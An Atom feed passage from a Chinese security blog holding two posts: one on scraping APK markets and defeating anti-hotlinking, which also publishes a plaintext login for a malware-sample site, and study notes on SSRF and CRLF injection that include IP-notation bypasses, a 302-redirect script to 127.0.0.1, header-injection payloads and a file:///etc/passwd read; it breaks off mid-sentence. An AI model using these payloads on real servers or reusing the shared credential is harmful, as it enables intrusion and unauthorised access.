<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Yiruma</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://someonesometimes.github.io/"/>
  <updated>2018-01-03T17:28:24.549Z</updated>
  <id>https://someonesometimes.github.io/</id>
  
  <author>
    <name>Yiruma</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>APK应用市场爬虫的爬取与下载策略</title>
    <link href="https://someonesometimes.github.io/2018/01/03/APK%E5%BA%94%E7%94%A8%E5%B8%82%E5%9C%BA%E7%88%AC%E8%99%AB%E7%9A%84%E7%88%AC%E5%8F%96%E4%B8%8E%E4%B8%8B%E8%BD%BD%E7%AD%96%E7%95%A5/"/>
    <id>https://someonesometimes.github.io/2018/01/03/APK应用市场爬虫的爬取与下载策略/</id>
    <published>2018-01-03T09:53:18.000Z</published>
    <updated>2018-01-03T17:28:24.549Z</updated>
    
    <content type="html"><![CDATA[<p>最近在集中突击项目，队友在用机器学习算法做应用分析的时候需要大量的软件样本。其中恶意软件可以在公开的病毒中下载<a href="https://virusshare.com" target="_blank" rel="external">https://virusshare.com</a>，从论文中可以看到基本上所有的做恶意软件分析的项目都是从这个库中下载的恶意软件样本，这个网站要联系作者提供邀请码才能注册，虽然作者回复的也蛮及时，闲麻烦的同学可以先用我的账号登陆看看，ID:Yiruma, Pass:cauccauc</p><p>算法分析中除了恶意软件样本，还需要很多正常的，保证安全的软件，然而网上并没有提供这样的下载连接，所以只能自己去应用市场上爬，因此也写了不少小爬虫。因为软件下载网站或多或少都会有防盗链的机制，这里分享出来我的设计思路。</p><a id="more"></a><h2 id="一般的防盗链机制"><a href="#一般的防盗链机制" class="headerlink" title="一般的防盗链机制"></a>一般的防盗链机制</h2><p>我们在网站上下载一个apk应用往往需要这几个步骤：</p><ol><li>打开应用市场主页</li><li>打开某一个应用分类</li><li>应用分类中展示了此分类下的软件列表，我们点进去一个进入某一个apk页面</li><li>apk页面一般不会直接提供下载连接，而是在我们点击下载按钮的时候，使用js来异步发出请求，获取apk的真正下载连接，这些下载连接往往是动态变化，有时间限制的</li><li>浏览器根据下载连接下载apk</li></ol><p>整个过程解决起来大致可以分为三块</p><p>第一步就是从网站上爬取所有的apk链接，这些apk链接一般都是不会变化的，所以设计起来就和普通的爬虫一样</p><p>第二部我们需要设计一个函数，输入apk链接，能够自动将apk的下载链接解析出来</p><p>最后一步就需要我们能够对下载链接实现批量下载</p><p>下面就开始分别介绍这三个步骤。这之前还有一点很重要的是，实际网站都会对过量访问做限制，如果短时间内访问量过大，就会封掉ip导致一段时间内403或者429，所以爬取中<strong>千万不要搞多线程，两次请求间千万要time.sleep()上一段时间</strong>，一旦被封ip，一般都要一个多小时后才能解禁</p><h2 id="第一步：-从应用市场主页中爬取所有应用链接"><a href="#第一步：-从应用市场主页中爬取所有应用链接" class="headerlink" title="第一步： 从应用市场主页中爬取所有应用链接"></a>第一步： 从应用市场主页中爬取所有应用链接</h2><p>为了下载的应用分布比较全面，我的爬取策略是首先从应用市场主页面拿到所有的分类页面链接，之后再从分类页面中下载详细的apk</p><p>这些链接往往都比较明确，如果bs4用的比较熟的话可以直接通过解析html页面然后从DOM上拿链接，不过我的做法比较简单，不过也很有效，直接通过正则表达式就可以获取，比如如下页面</p><p><img src="https://ws1.sinaimg.cn/large/93e435bbly1fn3um8skxyj20ko0930uz.jpg" alt=""></p><p>左边是在网站主页上找到的分类链接，可以看到有Business,Education,Entertainment等诸多种类，他们的链接可以用如下正则提取</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://www.xxx.com/category/[a-zA-Z0-9]&#123;1,30&#125;/\d/</div></pre></td></tr></table></figure><p>右边是点进去分类页面后所展示出的apk列表，可以看到这些apk的链接可以用如下正则提取</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://www.xxx.com/app/[a-zA-Z0-9\.]&#123;1,100&#125;/</div></pre></td></tr></table></figure><p>大致通过如下代码可以拿到不少apk的链接</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#传入应用市场主页URL，拿到所有分类链接</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">getCategoryList</span><span class="params">(url)</span>:</span></div><div class="line">    mainPage = s.get(url).content</div><div class="line">    regGetCategory = re.compile(<span class="string">"/category/.*/\""</span>)</div><div class="line">    categoryList = regGetCategory.findall(mainPage)</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(categoryList)):</div><div class="line">        categoryList[i] = <span class="string">"https://www.apkmonk.com"</span> + categoryList[i][:<span class="number">-3</span>] + <span class="string">"&#123;&#125;"</span></div><div class="line"></div><div class="line">    <span class="keyword">return</span> categoryList</div><div class="line"> </div><div class="line"><span class="comment">#传入分类链接，获得所有apk链接</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">getAppList</span><span class="params">(url)</span>:</span></div><div class="line">    subPage = s.get(url).content</div><div class="line">    regSubpage = re.compile(<span class="string">"/app/.*/\""</span>)</div><div class="line">    appList = regSubpage.findall(subPage)</div><div class="line">    appListRetu = []</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> appList:</div><div class="line">        temp = <span class="string">"https://www.apkmonk.com"</span> + i[:<span class="number">-1</span>]</div><div class="line">        <span class="keyword">if</span> temp <span class="keyword">not</span> <span class="keyword">in</span> appListRetu:</div><div class="line">            appListRetu.append(temp)</div><div class="line"></div><div class="line">    <span class="keyword">return</span> appListRetu</div></pre></td></tr></table></figure><p>简单跑了一下，获取每个分类下的10页，最后拿到了10000个左右的apk链接，将这些链接保存下来，可以一直重复使用</p><h2 id="第二步：-传入一个apk链接，获得其下载链接"><a href="#第二步：-传入一个apk链接，获得其下载链接" class="headerlink" title="第二步： 传入一个apk链接，获得其下载链接"></a>第二步： 传入一个apk链接，获得其下载链接</h2><p>这里就是针对防盗链措施的解决方法，看下比较常见的apk防盗链措施：</p><p>我们首先访问之前拿到的一个apk链接</p><p><a href="https://www.apkmonk.com/app/in.promettheus.fhrai/" target="_blank" rel="external">https://www.apkmonk.com/app/in.promettheus.fhrai/</a></p><p>访问之后，页面上显示DownloadAPK，链接指向</p><p><a href="https://www.apkmonk.com/download-app/in.promettheus.fhrai/5_in.promettheus.fhrai_2018-01-03.apk/" target="_blank" rel="external">https://www.apkmonk.com/download-app/in.promettheus.fhrai/5_in.promettheus.fhrai_2018-01-03.apk/</a></p><p>到这里还不是最终的apk下载链接，因为尝试访问会发现返回的仍是一个html页面，其中的关键信息如下：</p><p><code>$(&#39;#download_sub_text&#39;).html(&#39;You could also download directly by &lt;a onclick=&quot;ga(\&#39;send\&#39;, \&#39;event\&#39;, \&#39;link\&#39;, \&#39;click_here\&#39;, \&#39;in.promettheus.fhrai\&#39;);&quot; href=&quot;&#39;+data.url+&#39;&quot;&gt;clicking here!&lt;/a&gt;&#39;);</code></p><p>这是一段js代码，可以看出来我们的下载链接是通过js动态执行后才生成的，所以我们直接访问这个url是无法拿到下载链接的，这里介绍两种思路</p><h3 id="方法一：类似于XSSbot的js代码执行"><a href="#方法一：类似于XSSbot的js代码执行" class="headerlink" title="方法一：类似于XSSbot的js代码执行"></a>方法一：类似于XSSbot的js代码执行</h3><p>在xss中的bot可以触发我们所发送的js代码，这里关于bot怎么写，可以去翻下土师傅的blog，我采用的是Phantomjs来动态加载js代码</p><p>梳理下我们的思路：</p><ol><li>调用phantomjs动态执行页面，之后将执行js后的页面重新保存</li><li>python解析html文件，拿到真正的下载链接</li></ol><p>我们的js可以这样写：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> webPage = <span class="built_in">require</span>(<span class="string">'webpage'</span>);</div><div class="line"><span class="keyword">var</span> system = <span class="built_in">require</span>(<span class="string">'system'</span>);</div><div class="line"><span class="keyword">var</span> args = system.args[<span class="number">1</span>];</div><div class="line"><span class="keyword">var</span> page = webPage.create();</div><div class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>)</div><div class="line"></div><div class="line"><span class="comment">//将参数作为打开的页面</span></div><div class="line">page.open(args,<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line"><span class="comment">//2000毫秒后，执行页面内容保存工作</span></div><div class="line">setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">fs.write(<span class="string">'E:/fei.txt'</span>, page.content, <span class="string">'w'</span>);</div><div class="line">phantom.exit();</div><div class="line">&#125;,<span class="number">2000</span>);</div><div class="line">&#125;);</div></pre></td></tr></table></figure><p>整个python代码大致长这样</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">down_url</span><span class="params">(url)</span>:</span></div><div class="line"></div><div class="line">    <span class="comment">#获得apk链接</span></div><div class="line">    os.system(<span class="string">"phantomjs test.js "</span>+url)</div><div class="line">    <span class="comment">#从文件中解析内容</span></div><div class="line">    content = open(<span class="string">"E:/fei.txt"</span>, <span class="string">'r'</span>).read()</div><div class="line">    apk_url = reg.findall(content)</div><div class="line">    <span class="keyword">if</span> len(apk_url) == <span class="number">0</span>:</div><div class="line">        <span class="keyword">return</span> <span class="keyword">False</span></div><div class="line">    <span class="keyword">return</span> apk_url</div></pre></td></tr></table></figure><h3 id="方法二：使用python模拟js代码"><a href="#方法二：使用python模拟js代码" class="headerlink" title="方法二：使用python模拟js代码"></a>方法二：使用python模拟js代码</h3><p>这也是比较推荐的方法，有些获取下载链接的js其实并不复杂，通过对其分析，我们甚至可以找到更为简便的api</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$.get(<span class="string">'/down_file/'</span>,&#123;<span class="string">"pkg"</span>:<span class="string">"in.promettheus.fhrai"</span>,<span class="string">"key"</span>:<span class="string">"5_in.promettheus.fhrai_2018-01-03.apk"</span>&#125;).done(<span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span></div><div class="line">&#123;</div><div class="line"><span class="comment">//xxx...</span></div><div class="line">&#125;</div></pre></td></tr></table></figure><p>可以看到其实就是调用jq的get方法发送了一条get请求，请求是</p><p><a href="https://www.xxx.com/down_file/?pkg=in.promettheus.fhrai&amp;key=5_in.promettheus.fhrai_2018-01-03.apk" target="_blank" rel="external">https://www.xxx.com/down_file/?pkg=in.promettheus.fhrai&amp;key=5_in.promettheus.fhrai_2018-01-03.apk</a></p><p>我们尝试过去访问一下，返回结果如下：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&#123;<span class="attr">"url"</span>: <span class="string">"http://apk.apkmonk.com/apks-3/in.promettheus.fhrai_2018-01-03.apk?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=IFVYHACUO60QSGWW9L9Z%2F20180103%2Fus-east-1%2Fs3%2Faws4_request&amp;X-Amz-Date=20180103T164103Z&amp;X-Amz-Expires=2400&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=b187cf0e7b2b680b5dcd858243ba624cb0aa360021af9827628af21ee29162ed"</span>, <span class="attr">"resp"</span>: <span class="string">"success"</span>&#125;</div></pre></td></tr></table></figure><p>json格式数据，里面的url就是我们的apk下载链接，所以直接用python生成url然后访问就可以拿到apk的连接，Bingo！</p><p>这种分析网站的api方法是比较推荐的，毕竟phantomjs的方法执行起来太过麻烦，事实上在这个网站里我不仅发现了不止一个能够获取apk下载连接的api</p><p>OK，最后我们拿到的下载连接大致就是这个样子</p><p><a href="http://apk.apkmonk.com/apks-3/in.promettheus.fhrai_2018-01-03.apk?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=IFVYHACUO60QSGWW9L9Z%2F20180103%2Fus-east-1%2Fs3%2Faws4_request&amp;X-Amz-Date=20180103T160517Z&amp;X-Amz-Expires=2400&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=3e8625b5087cd37ab6f274c08957c26c50699589772040e00315669e32631422" target="_blank" rel="external">http://apk.apkmonk.com/apks-3/in.promettheus.fhrai_2018-01-03.apk?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=IFVYHACUO60QSGWW9L9Z%2F20180103%2Fus-east-1%2Fs3%2Faws4_request&amp;X-Amz-Date=20180103T160517Z&amp;X-Amz-Expires=2400&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=3e8625b5087cd37ab6f274c08957c26c50699589772040e00315669e32631422</a></p><h2 id="第三步：-下载连接分析与下载方式"><a href="#第三步：-下载连接分析与下载方式" class="headerlink" title="第三步： 下载连接分析与下载方式"></a>第三步： 下载连接分析与下载方式</h2><p>首先我们应该简单分析一下这些连接，就拿上面的连接作为例子</p><p>可以看到里面有关于时间的参数X-Amz-Date=20180103T160517Z，猜测是连接生成时间，还有一个名为Expires的参数X-Amz-Expires=2400，猜测是连接有效时间，2400猜测是2400s也就是40分钟，从参数X-Amz-Algorithm=AWS4-HMAC-SHA256中可以看到使用了HMAC算法，对应的签名是X-Amz-Signature=3e8625b5087cd37ab6f274c08957c26c50699589772040e00315669e32631422，没错正好是SHA256的64位，这样整个连接是不可伪造的了，我们不能手动修改时间参数保证链接一直有效，也不能猜测组合生成hash的参数，因为使用了HMAC。另一方面，连接还是有时间的所以拿到连接后还是要尽快下载才行，不能批量拿到所有的下载连接再批量下载了。简单验证一下我们的猜想，我测试了一个昨天的连接，以及一个修改了时间参数的连接，结果都是返回403Forbidden，说明我们的下载连接没有通过验证，不能下载。</p><p>之后便是下载方式的介绍了，这里还是介绍两种</p><h3 id="Wget"><a href="#Wget" class="headerlink" title="Wget"></a>Wget</h3><p>在拿到下载连接后，直接python通过系统调用的方式调用wget工具完成下载，这种的好处是可以在拿到连接后直接下载，同时也很方便控制多线程同时下载，被禁ip的话解封后可以接着上次的接着下载，但问题也很明显，首先wget这个工具总感觉下载速度不快，另外python系统调用os.system(“wget xxx”)对返回结果不好观察，尤其是开多个线程同时下载的时候控制台输出的命令返回结果简直是群魔狂舞，所以推荐真的使用这种方法的话加上-q 或者-nv参数开启静默下载功能，这样就没有输出了。</p><p>另外一个可能用到的参数是-O，用于指定下载文件的位置以及文件名，还有个参数–spider，表示不下载任何东西，只是看下响应头来后的文件大小，不过感觉有时候并没有用。。。</p><h3 id="IDM"><a href="#IDM" class="headerlink" title="IDM"></a>IDM</h3><p>IDM是今天才想到的下载方法，这是一个文件下载工具，下载速度极快，也有很强大的下载自定义功能。我们要做的就是每次获取一小部分下载连接，然后以html格式写到文件里，之后打开此html文件，右键使用IDM下载全部连接，就可以将所有的连接添加到下载队列。</p><p><img src="https://ws1.sinaimg.cn/large/93e435bbly1fn3wvmhpupj20hs08yjss.jpg" alt=""></p><p>那些error请不要在意，如上面所述这些下载连接都已经过时了，没有通过检测</p><h2 id="关于网站防盗链的一些考虑"><a href="#关于网站防盗链的一些考虑" class="headerlink" title="关于网站防盗链的一些考虑"></a>关于网站防盗链的一些考虑</h2><p>其实从上面来看，通过程序批量的获得一些apk还是比较容易实现的，通常的js执行然后获取下载连接的方案很容易解决，事实上整个操作中对我们造成最大的阻碍是云服务器厂商做的访问限制，网站的防护通常并不有效</p><p>也许网站可以设置为用户注册后才能下载apk，并基于用户身份进行apk下载的峰值限制，也许还可以在每个apk下载前都需要人工输入验证码，或者可以将自己的api隐藏的更为隐蔽一点，个人觉得，还是在每次下载前引入不得不人工操作的步骤才是最有效的方法，比如下面这样 2333</p><p><img src="https://ws1.sinaimg.cn/large/93e435bbly1fn3x4o803dj20hj0a474v.jpg" alt=""></p><h2 id="与本文无关，记录些写爬虫时的问题与学到的东西"><a href="#与本文无关，记录些写爬虫时的问题与学到的东西" class="headerlink" title="与本文无关，记录些写爬虫时的问题与学到的东西"></a>与本文无关，记录些写爬虫时的问题与学到的东西</h2><p>http的head方法是不获取文件，只是请求响应头，可以用于获取文件大小，python中的requests包支持head方法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests</div><div class="line"></div><div class="line">s = requests.session()</div><div class="line">s.head(url)</div></pre></td></tr></table></figure><p>相同的在curl中对应的参数是 curl -I  ， wget中是wget –spider</p><p><br></p><p>关于如何做到文件下载记录，考虑了很多种，apkList.txt除了apk连接，做成一个字典，一定要有的是后面0，1表示已经处理和没有处理，如果下载连接可以一直保存的话，可以考虑将下载连接也存到里面，之后将dict对象使用json转成字符串存储到apkList.txt中</p><p><br></p><p>json的简单使用方法再复习一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> json</div><div class="line"></div><div class="line">dict = json.loads(str)</div><div class="line">str = json.dumps(dict)</div></pre></td></tr></table></figure><p><br></p><p>在python3中，os.popen改成了子线程执行，程序不会阻塞等待命令执行完毕，需要单线程的话可以采用os.system，不过阅读popen的文档应该能找到更好的解决方案</p><p><br></p><p>跑的过程中需要持续写文件的话，可以使用fw.flush()函数，将缓存区中的字符写到文件中，防止中途报错而丢失之前的数据</p><p><br></p><p>当时做多线程拿下载连接的时候，考虑了这样的方式，每个线程处理完需要往dict中置apk的url为1表示下载完成，为了防止中途报错丢失数据，每次结束后都重新将dict写入文件。测试中发现中途报错终止的时候，子线程并不会直接停止，而是停止阻塞强行运行完毕，之后所有程序结束运行，记得之前在java线程池实现的时候线程池的确设计了这种机制，后来爬虫决定不用多线程了，此事也就作罢</p><p><br></p><p>线程池简单使用方法记录，包在python3中可用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> concurrent.futures <span class="keyword">import</span> ThreadPoolExecutor</div><div class="line"><span class="comment">#参数指定线程池的大小</span></div><div class="line">pool = ThreadPoolExecutor(<span class="number">5</span>)</div><div class="line"><span class="comment">#submit往池子里扔函数，第一个是函数名，后面是参数</span></div><div class="line">pool.submit(getApkHTML, <span class="number">50</span>)</div><div class="line">pool.submit(getApkHTML, <span class="number">100</span>)</div><div class="line">pool.submit(getApkHTML, <span class="number">150</span>)</div><div class="line">pool.submit(getApkHTML, <span class="number">200</span>)</div><div class="line">pool.submit(getApkHTML, <span class="number">250</span>)</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近在集中突击项目，队友在用机器学习算法做应用分析的时候需要大量的软件样本。其中恶意软件可以在公开的病毒中下载&lt;a href=&quot;https://virusshare.com&quot;&gt;https://virusshare.com&lt;/a&gt;，从论文中可以看到基本上所有的做恶意软件分析的项目都是从这个库中下载的恶意软件样本，这个网站要联系作者提供邀请码才能注册，虽然作者回复的也蛮及时，闲麻烦的同学可以先用我的账号登陆看看，ID:Yiruma, Pass:cauccauc&lt;/p&gt;
&lt;p&gt;算法分析中除了恶意软件样本，还需要很多正常的，保证安全的软件，然而网上并没有提供这样的下载连接，所以只能自己去应用市场上爬，因此也写了不少小爬虫。因为软件下载网站或多或少都会有防盗链的机制，这里分享出来我的设计思路。&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>服务端URL处理问题学习笔记 SSRF/CRLF/其他</title>
    <link href="https://someonesometimes.github.io/2017/11/20/%E6%9C%8D%E5%8A%A1%E7%AB%AFURL%E5%A4%84%E7%90%86%E9%97%AE%E9%A2%98%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-SSRF-CRLF-%E5%85%B6%E4%BB%96/"/>
    <id>https://someonesometimes.github.io/2017/11/20/服务端URL处理问题学习笔记-SSRF-CRLF-其他/</id>
    <published>2017-11-20T15:34:58.000Z</published>
    <updated>2018-03-22T02:27:53.091Z</updated>
    
    <content type="html"><![CDATA[<p>LCTF里好多涉及到服务端对url进行处理的问题啊，也暴露出了自己对这一块知识的严重欠缺，ssrf也做过些笔记，但总感觉还不足以专门写东西发出来，通过在LCTF中的一些知识点收集以及自己的一些搜索，感觉在服务端的URL处理这块已经比较全面了，故做下整理，虽然现在认识还很浅，以后慢慢补充吧，保持更新~</p><p>顺便膜一下orange大大，orange师傅在blackhat上的议题再一次刷新了自己对一名真正的黑客的认知，这里就不奢望能达到orange师傅的水平了，只是希望自己能在以后的安全路上时时警醒自己，一名真正的安全从业人员应该是什么样的。</p><a id="more"></a><p>还是先从场景开始，我们经常可以看到用户提交一条URL，之后服务器会对此链接进行处理，如果进行访问并对用户做出某些反馈的话，在操作不当的情况下就可能产生各种各样的问题，基本就是以下几个方面</p><ul><li>ssrf  对任意url都进行访问，就有可能实现内网探测，文件读取等功能</li><li>crlf   实现HTTP头的注入，因为可以控制HTTP头了，就可用于构造各种基于HTTP的协议。可以控制cookie所以也可能实现会话控制</li><li>利用一些发送请求库中的特殊功能，这就需要仔细阅读发送请求库的功能了</li></ul><p>下面就对上面这三点展开详细的介绍</p><h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><p>我们如果想限制用户发来的危险url的话，就需要对host进行一些判断，这里ph师傅有一篇文章写的很全<a href="https://www.leavesongs.com/PYTHON/defend-ssrf-vulnerable-in-python.html" target="_blank" rel="external">谈一谈如何在Python开发中拒绝SSRF漏洞</a></p><p>ph师傅讲一个比较安全的判断流程应该是这样的</p><ol><li><p>解析目标URL，获取其Host </p></li><li><p>将域名进行解析成ip</p></li><li><p>将ip统一转化成相同的格式</p></li><li><p>然后判定ip是不是属于局域网网段</p></li><li><p>对每一次访问都要做出上述判定，因为考虑到302跳转的存在</p></li></ol><p>那么如果并没有按照上述推荐流程来处理用户发来的url的话，我们可以看到如下攻击方式：</p><h4 id="在URL解析上混淆"><a href="#在URL解析上混淆" class="headerlink" title="在URL解析上混淆"></a>在URL解析上混淆</h4><p>orange大大在bh上的议题中已经做了详细的阐释并归纳了一张图告诉我们哪些库的处理可能存在问题</p><p><img src="https://ws1.sinaimg.cn/large/93e435bbly1flphsusxx4j20j50b00u1.jpg" alt=""></p><p>url虽然在RFC2396, RFC3986 进行了明确的标准定义，但这只是推荐标准，具体不同的语言，甚至不同的库都有其自己的实现，所以可能url解析获取并验证的是一种host，而在发送请求的库中使用的是另一种host，就造成了这种问题，要避免这种问题，url的解析与url的请求需要使用相同的标准。orange也举了一些php中解析不一致的例子，这些环境下会存在漏洞：</p><p><strong>php的<code>parse_url() 与readfile()</code>的解析不一致</strong></p><p><img src="https://ws1.sinaimg.cn/large/93e435bbly1flpi9k6ptcj20lm0jedha.jpg" alt=""></p><p><strong>php中<code>parse_url() 与curl</code>解析不一致</strong></p><p>我们可以看到，不仅是php中的parse_url()，其他的注入NOdeJS的URL()，Go的net/url等，在url的解析上都与curl出现了差异。</p><p>第一种情况在curl之前的版本中已经修复了</p><p>第二种情况在curl7.54.0版本中也会修复</p><p><img src="https://ws1.sinaimg.cn/large/93e435bbly1flpidcno9lj20kc0bb766.jpg" alt=""></p><p>到这里我们可以简单考虑下，为什么通过上述的符号会存在解析不一致呢？在url中，<code>@</code>符号之前表示user成分，@之前的的user中又通过<code>:</code>对user与pass做了分割，<code>#</code>后面是fragment成分，port前需要有<code>:</code>，host则是以<code>/</code>或者<code>:</code>或者<code>?</code>等作为结尾等等，可以看到这么多的关键字符在里面，那么他们同时出现时应该以什么优先级进行解析？多个相同符号出现时应该以前面的还是后面的为准？正是这些并没有统一规定的东西最终造成了解析对url解析不一致的问题。</p><p>这种问题是如此严重，我们可以看到同一个url，甚至python的三种库中都产生了不同的解析结果 XD</p><p><img src="https://ws1.sinaimg.cn/large/93e435bbly1flpislsoajj20d806adg6.jpg" alt=""></p><h4 id="没有对域名进行ip转换的话，可以通过一些奇特的域名将ip解析到内网里面"><a href="#没有对域名进行ip转换的话，可以通过一些奇特的域名将ip解析到内网里面" class="headerlink" title="没有对域名进行ip转换的话，可以通过一些奇特的域名将ip解析到内网里面"></a>没有对域名进行ip转换的话，可以通过一些奇特的域名将ip解析到内网里面</h4><p>通过这个网站<a href="http://xip.io/" target="_blank" rel="external">http://xip.io/</a>可以将域名解析到本地ip</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">ping 127.0.0.1.xip.io -n 1</div><div class="line"></div><div class="line">正在 Ping 127.0.0.1.xip.io [127.0.0.1] 具有 32 字节的数据:</div><div class="line">来自 127.0.0.1 的回复: 字节=32 时间&lt;1ms TTL=128</div></pre></td></tr></table></figure><h4 id="通过其他支持的ip写法来绕过host检测"><a href="#通过其他支持的ip写法来绕过host检测" class="headerlink" title="通过其他支持的ip写法来绕过host检测"></a>通过其他支持的ip写法来绕过host检测</h4><ul><li>八进制及八进制缩写           0177.0.0.1   017700000001</li><li>十六进制及十六进制缩写   0x7f.0.0.1    0x7f000001</li><li>十进制缩写                           2130706433</li><li>省略0   127.1    0177.1    0x7f.1</li><li>127其实是127/8的，所以127.233.233.233也是支持的，并不是只有127.0.0.1</li><li>这一种比较少见，也很可能没有防护：在linux中，0是可以传输到本机IP的，所以也可以作为linux服务器下的一种选择方案</li></ul><h4 id="通过302跳转方式来绕过检测"><a href="#通过302跳转方式来绕过检测" class="headerlink" title="通过302跳转方式来绕过检测"></a>通过302跳转方式来绕过检测</h4><p>如果检测完成没有问题的话，url还是不能直接扔到库里面请求的，因为可能不少库都支持在接收到302的HTTP时直接跳转。比如python的requests库，默认的参数为<code>allow_redirects=True</code>也就是在302下会自动跳转。那么我们可以在自己的vps上构造这样的内容</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="number">302.</span>php</div><div class="line"></div><div class="line"><span class="meta">&lt;?php</span></div><div class="line">header(<span class="string">"Location:  http://127.0.0.1"</span>);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p>然后向服务器发送链接<code>http://vps/302.php</code>，最终就会跳转到内网地址127.0.0.1上</p><p>所以在安全处理中，我们需要对每一次的http访问的参数都做出过滤，而不是只简单过滤一次后就扔到请求库中，这里可以模仿ph师傅的方式，采用requests中的hook支持来对库中的代码做出改善，对每一次请求的参数都进行过滤</p><h2 id="CRLF"><a href="#CRLF" class="headerlink" title="CRLF"></a>CRLF</h2><p>orange师傅同样整理了一份当前存在CRLF漏洞的名单出来，在攻击时首先将请求指向自己的vps看看服务端是用什么发出的请求，如果在库里面，就存在CRLF可以利用</p><p>可以看到常见的urllib2,wget,NodeJS http,Java net.URL都存在这种问题</p><p><img src="https://ws1.sinaimg.cn/large/93e435bbly1flphsi6huij20d90b0q4i.jpg" alt=""></p><p><strong>利用CRLF可以实现的一些东西</strong></p><ul><li><p><code>%0d%0a</code>代表http中的一个换行，也就可以新引入一个header头，如果连用两次，就代表头结束了，接下来的是内容，所以可以将后面一些比较讨厌的头去掉，比如CSP2333  。 还可以写任意的传输数据，比如写一些xss啥的。</p></li><li><p>自己可以添加任意的头，比如Cookie实现会话控制，比如实现一些特殊的协议，就像lctf中的实现redis的控制，orange的通过https发送SMTP报文</p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">0:8000?url=https://127.0.0.1 %0d%0aHELO orange.tw%0d%0aMAIL FROM...:25</div><div class="line"></div><div class="line">0:8000?url=http://118.89.16.36%0d%0aheaderInject:%20Inject%0d%0a%0d%0a&lt;script&gt;alert(&apos;123&apos;)&lt;/script&gt;:80/x/</div><div class="line"></div><div class="line">0:8000?url=http://118.89.16.36%0d%0aheaderInject:%20Inject:80/x/</div></pre></td></tr></table></figure><h2 id="利用发送请求库的特殊功能"><a href="#利用发送请求库的特殊功能" class="headerlink" title="利用发送请求库的特殊功能"></a>利用发送请求库的特殊功能</h2><ul><li><p>curl支持file协议，所以url为<code>file:///etc/passwd</code>是可以看实现本地文件读取的</p></li><li><p>wget支持一些有趣的参数，比如-O 参数可以将get到的文件存放到指定的位置，最重要的是可以实现任意的重命名</p></li><li><p>curl中支持@参数，可以实现本地文件读取，在php5.6中就已经默认禁用了，在7.0版本后直接去掉了这个功能，我们可以通过如下语句打开@参数的功能</p><p><code>curl_setopt($ch, 